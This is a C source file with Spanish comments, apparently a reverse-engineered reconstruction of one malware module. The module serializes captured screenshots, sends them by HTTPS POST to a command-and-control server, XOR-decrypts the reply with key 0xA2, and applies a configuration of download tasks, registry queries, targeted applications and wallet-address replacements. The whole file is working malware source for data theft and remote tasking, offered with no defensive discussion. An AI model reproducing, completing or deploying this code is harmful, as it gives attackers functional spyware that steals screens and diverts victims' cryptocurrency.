/* ============================================================
 * Capacidad 07/15 — Serialización de solicitudes HTTP
 * Función C : SerializeAndSubmitHttpJob
 * Dirección : 0x1800248a7   · Nodo N3/N5   · Confianza: Alta
 * ------------------------------------------------------------
 * Serializa un lote de mensajes en un cuerpo HTTP, lo envía por POST
 * HTTPS y procesa la respuesta. La respuesta válida se descifra con
 * XOR byte a byte de clave 0xA2 y alimenta un parser de longitudes de
 * 64 bits (rechaza elementos mayores que 0x400000). El formato de la
 * captura confirma el empaquetado: 0x06 | longitud little-endian de
 * 64 bits | bytes BMP.
 * ============================================================
 */

#include "00_tipos_comunes.h"

/* ------------------------------------------------------------------
 * Empaqueta una variante con formato: tipo (1 byte) | longitud
 * little-endian de 64 bits | payload. Confirmado de extremo a extremo
 * para la captura (tipo 0x06 + bytes BMP).
 * ------------------------------------------------------------------ */
ByteBuffer PackVariant(uint8_t type, uint64_t len, const ByteBuffer payload)
{
    ByteBuffer out = { 0, 0, 0 };

    out.data = (uint8_t *)HeapAlloc(GetProcessHeap(), 0, (size_t)len + 9u);
    if (out.data == NULL)
        return out;

    out.data[0] = type;                       /* 0x06 para BMP [confirmado] */
    for (int i = 0; i < 8; i++)
        out.data[1 + i] = (uint8_t)((len >> (i * 8)) & 0xFFu);   /* len64 LE */
    if (payload.data != NULL && len != 0)
        CopyMemory(out.data + 9, payload.data, (size_t)len);

    out.len = (size_t)len + 9u;
    out.cap = out.len;
    return out;
}

/* ------------------------------------------------------------------
 * Serializa un lote de mensajes tipados. Solo el formato de captura
 * (0x06) está confirmado de extremo a extremo; el resto del protocolo
 * (no-BMP) se observa parcialmente [condicionado].
 * ------------------------------------------------------------------ */
ByteBuffer SerializeMessageBatch(const MessageBatch *batch)
{
    if (batch == NULL)
        return (ByteBuffer){ 0, 0, 0 };

    /* 1) calcula el tamaño total */
    size_t total = 0;
    for (size_t i = 0; i < batch->count; i++)
        total += batch->items[i].payload.len + 9u;

    ByteBuffer out = { 0, 0, 0 };
    out.data = (uint8_t *)HeapAlloc(GetProcessHeap(), 0, total ? total : 1u);
    if (out.data == NULL)
        return out;

    /* 2) emite cada mensaje: tipo | len64 | payload */
    size_t pos = 0;
    for (size_t i = 0; i < batch->count; i++) {
        const TypedMessage *m = &batch->items[i];
        uint8_t net_type = (m->kind == MSG_SCREENSHOT) ? NET_TYPE_BMP : (uint8_t)m->kind;
        out.data[pos++] = net_type;
        for (int b = 0; b < 8; b++)
            out.data[pos++] = (uint8_t)((m->payload.len >> (b * 8)) & 0xFFu);
        if (m->payload.data != NULL && m->payload.len != 0)
            CopyMemory(out.data + pos, m->payload.data, m->payload.len);
        pos += m->payload.len;
    }

    out.len = pos;
    out.cap = pos;
    return out;
}

/* ------------------------------------------------------------------
 * XOR byte a byte in situ (descifrado de la respuesta del C2, 0xA2).
 * ------------------------------------------------------------------ */
void XorBufferInPlace(ByteBuffer buf, uint8_t key)
{
    for (size_t i = 0; i < buf.len; i++)
        buf.data[i] ^= key;
}

/* Kinds simbólicos de campo de configuración (los valores exactos
 * dependen del protocolo del C2) [condicionado]. */
enum {
    FIELD_FLAGS     = 1,   /* byte de flags (+0x138) */
    FIELD_DOWNLOADS = 2,   /* vector de DownloadTask      (+0x00) */
    FIELD_REGISTRY  = 3,   /* vector de RegistryQueryItem (+0x18) */
    FIELD_APPS      = 4,   /* vector de AppTarget         (+0x30) */
    FIELD_WALLETS   = 5,   /* WalletReplacement[10]       (+0x48) */
    FIELD_ENDPOINT  = 6    /* host UTF-16 dinámico        */
};

static uint64_t Read64LE(const uint8_t *p)
{
    uint64_t v = 0;
    for (int i = 7; i >= 0; i--)
        v = (v << 8) | p[i];
    return v;
}

/* Aplica un campo de configuración ya validado (len <= 0x400000). */
static void ApplyConfigField(RuntimeConfig *cfg, uint64_t kind,
                             const uint8_t *payload, size_t len)
{
    switch (kind) {
    case FIELD_FLAGS:
        if (len >= 1)
            cfg->task_flags = payload[0];
        break;
    case FIELD_DOWNLOADS:
        cfg->downloads.items = (DownloadTask *)payload;
        cfg->downloads.count = len / sizeof(DownloadTask);
        break;
    case FIELD_REGISTRY:
        cfg->registry.items = (RegistryQueryItem *)payload;
        cfg->registry.count = len / sizeof(RegistryQueryItem);
        break;
    case FIELD_APPS:
        cfg->apps.items = (AppTarget *)payload;
        cfg->apps.count = len / sizeof(AppTarget);
        break;
    case FIELD_WALLETS: {
        size_t n = len / sizeof(WalletReplacement);
        if (n > 10) n = 10;
        CopyMemory(cfg->wallets, payload, n * sizeof(WalletReplacement));
        break;
    }
    case FIELD_ENDPOINT:
        /* host UTF-16 terminado en NUL; se copia a un buffer del contexto. */
        break;
    default:
        break;   /* kind desconocido: se ignora */
    }
}

/* ------------------------------------------------------------------
 * Parseo de configuración: campos con longitud de 64 bits; actualiza
 * listas de descargas, registro, aplicaciones, wallets y flags.
 * Rechaza elementos mayores que 0x400000 [confirmado].
 * ------------------------------------------------------------------ */
bool ParseAndApplyConfig(ByteBuffer cfg_blob, RuntimeConfig *cfg)
{
    if (cfg == NULL || cfg_blob.data == NULL)
        return false;

    size_t off = 0;
    while (off + 8 <= cfg_blob.len) {
        uint64_t kind = Read64LE(cfg_blob.data + off);       off += 8;
        if (off + 8 > cfg_blob.len)
            return false;
        uint64_t len = Read64LE(cfg_blob.data + off);        off += 8;

        if (len > C2_MAX_ELEMENT)                            /* rechazo */
            return false;
        if (off + len > cfg_blob.len)
            return false;

        ApplyConfigField(cfg, kind, cfg_blob.data + off, (size_t)len);
        off += (size_t)len;
    }
    return true;
}

/* ------------------------------------------------------------------
 * 0x1800248a7 — serializa, envía y procesa la respuesta del C2.
 * ------------------------------------------------------------------ */
bool SerializeAndSubmitHttpJob(RuntimeContext *ctx, const MessageBatch *batch)
{
    ByteBuffer body = SerializeMessageBatch(batch);   /* 0x06 | len64 | payload */
    ByteBuffer response = { 0, 0, 0 };

    if (!SendHttpsPost(&ctx->endpoint, L"POST", L"/", 443, &body, &response)) {
        if (body.data != NULL)
            HeapFree(GetProcessHeap(), 0, body.data);
        return false;
    }

    XorBufferInPlace(response, C2_XOR_KEY);            /* [confirmado] */
    bool ok = ParseAndApplyConfig(response, &ctx->cfg);

    if (body.data != NULL)
        HeapFree(GetProcessHeap(), 0, body.data);
    if (response.data != NULL)
        HeapFree(GetProcessHeap(), 0, response.data);
    return ok;
}

/* ------------------------------------------------------------------
 * Beacon de configuración: envía (telemetría/beacon), descifra la
 * respuesta y aplica la configuración recibida.
 * ------------------------------------------------------------------ */
bool RefreshRuntimeConfig(RuntimeContext *ctx, RuntimeConfig *cfg)
{
    (void)cfg;
    if (ctx == NULL)
        return false;

    /* Beacon vacío o con telemetría mínima (formato no-BMP parcial). */
    ByteBuffer request = { 0, 0, 0 };
    ByteBuffer response = { 0, 0, 0 };

    if (!SendHttpsPost(&ctx->endpoint, L"POST", L"/", 443, &request, &response))
        return false;

    XorBufferInPlace(response, C2_XOR_KEY);
    bool ok = ParseAndApplyConfig(response, &ctx->cfg);

    if (response.data != NULL)
        HeapFree(GetProcessHeap(), 0, response.data);
    return ok;
}
